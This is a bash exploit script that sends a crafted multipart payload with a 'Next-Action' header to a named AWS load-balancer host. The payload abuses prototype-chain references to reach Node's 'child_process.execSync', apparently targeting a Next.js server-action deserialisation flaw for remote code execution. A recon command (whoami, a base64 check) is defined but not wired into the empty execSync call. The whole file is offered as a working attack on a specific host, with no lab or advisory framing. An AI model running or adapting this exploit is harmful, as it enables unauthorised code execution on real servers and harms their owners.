#!/bin/bash
TARGET="a5b854fc6d10f4787bed4faf4bdc4c37-70723f05da021eea.elb.ap-southeast-2.amazonaws.com"
PORT=80
PAYLOAD_FILE="/tmp/payload_recon.bin"

# CMD: whoami > /tmp/whoami.txt; which base64 > /tmp/base64_check.txt
CMD='whoami > /tmp/whoami.txt; which base64 > /tmp/base64_check.txt'

python3 -c "
import sys
payload = '''------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"0\"\r
\r
{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('');\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"1\"\r
\r
\"$@0\"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"2\"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r
'''
sys.stdout.buffer.write(payload.replace('\\r\\n', '\r\n').encode())
" > "$PAYLOAD_FILE"

curl -s -X POST "http://${TARGET}:${PORT}"     -H "Next-Action: x"     -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"     --data-binary @"$PAYLOAD_FILE" > /dev/null
